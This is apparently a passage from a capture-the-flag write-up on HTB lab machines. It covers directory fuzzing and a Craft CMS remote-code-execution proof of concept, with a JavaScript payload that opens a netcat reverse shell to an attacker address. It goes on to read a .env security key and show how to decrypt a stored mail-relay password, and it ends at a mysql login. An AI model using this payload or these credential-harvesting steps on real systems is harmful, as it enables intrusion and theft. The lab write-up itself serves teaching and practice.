These are user credentials being used to login to the portal. We can create a directory fuzzer and see if there are any other endpoints on this web server.

```bash
#!/bin/bash

while read -r path; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://portal.international.htb/$path")

    case "$status" in
        200|301|302|303|307|308)
            echo "$status $path"
            ;;
    esac
done < dir.txt
```
> Note: I copied over a directory listing from the SecLists wordlists from my attacker machine, this is what will be used to find endpoints on the web server.

Now we can run it and see if we get any hits.

```term
$ root@airside-ws01:/tmp# bash fuzz.sh 
200 #
200 #
200 #
200 #
200 
200 index
!!302 admin
301 assets
```
/admin looks interesting. When navigating to the endpoint, we are greeted with an admin login. We now have two sets of credentials we can try against the form, one of which, works.

After successful login we can see on the footer `Craft CMS Solo 2.9.8`. Looking for vulnerabilites in this software leads us to the following advisory:
> https://github.com/advisories/GHSA-qrgm-p9w5-rrfw

We are given a simple proof of concept, which we can tailor to our needs. Opening up the browser Console, we can virtually copy the request and fill in what we need wrapping it in JavaScript.
```js
fetch('/admin/actions/element-search/search', {
  method: 'POST',
  credentials: 'same-origin',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'X-CSRF-Token': Craft.csrfTokenValue
  },
  body: JSON.stringify({
 "elementType": "craft\\elements\\Category",
 "siteId": 1,
 "search": "",
 "condition": {
   "class": "craft\\elements\\conditions\\ElementCondition",
   "elementType": "craft\\elements\\Category",
   "fieldLayouts": [
     {
       "as rce": {
         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
         "__construct()": [
           {
             "attributeTypes": {
               "typecastBeforeSave": [
                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
                 "execute"
               ]
             },
!!             "typecastBeforeSave": "busybox nc 10.13.37.182 4000 -e /bin/bash"
           }
         ]
       },
       "on *": "self::beforeSave"
     }
   ]
 }
})
})
.then(async r => console.log(r.status, await r.text()));
```  
Now start a listener on the initial victim machine and send the JavaScript.
```term
$ contractor@airside-ws01:~$ nc -lvnp 4000
Listening on 0.0.0.0 4000
Connection received on 10.13.37.10 45434
whoami
www-data
```
> Note: I had a lot of trouble trying to get curl to work with this exploit, using the Console in the browser tools was much easier.

## [03] Dumping the Database, Decrypting User Credentials

We now have access to another machine. Looking through some web server files we can find database configs.

```term
$ www-data@portal:~/portal$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# General settings
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://portal.international.htb/
CRAFT_ENABLE_TWIG_SANDBOX=true
```

We can also find an interesting snippet in another file:
```term
$ www-data@portal:~/portal/modules/htbairways$ cat Module.php 
---snip---
 * HTB Airways — Craft integration module.
 *
 * Provides the "HTB Airways Miles" loyalty integration. Outbound member mail
 * (Miles balance statements) is delivered through the HTB Airways SMTP relay;
?? * the relay settings — host, port, username and the (encrypted) password — live
?? * in the `htbairways_settings` table.
 *
?? * The relay password is stored ENCRYPTED with the site security key and is only
?? * decrypted in memory at send time (see console/controllers/MilesController).
 * It is never written to configuration or logs in cleartext.
---snip---
```


Looking at the file use to decrypt the relay password shows the following:
```php
    private function relayConfig(): array
    {
        $kv = array_column(
            (new Query())->select(['name', 'value'])->from('{{%htbairways_settings}}')->all(),
            'value',
            'name'
        );

!!        $securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;
!!        $password = Craft::$app->getSecurity()
!!            ->decryptByKey(base64_decode($kv['mailRelayPassword']), $securityKey);

        return [
            'host' => $kv['mailRelayHost'] ?? 'mail.htbairways.htb',
            'port' => (int)($kv['mailRelayPort'] ?? 587),
            'user' => $kv['mailRelayUser'] ?? 'aporter',
            'password' => $password,
        ];
    }
```
Now we need the encrypted value in the database, which the previous files told us where it was stored.
```term
$ www-data@portal:~/portal$ mysql -h localhost -u craftuser -p
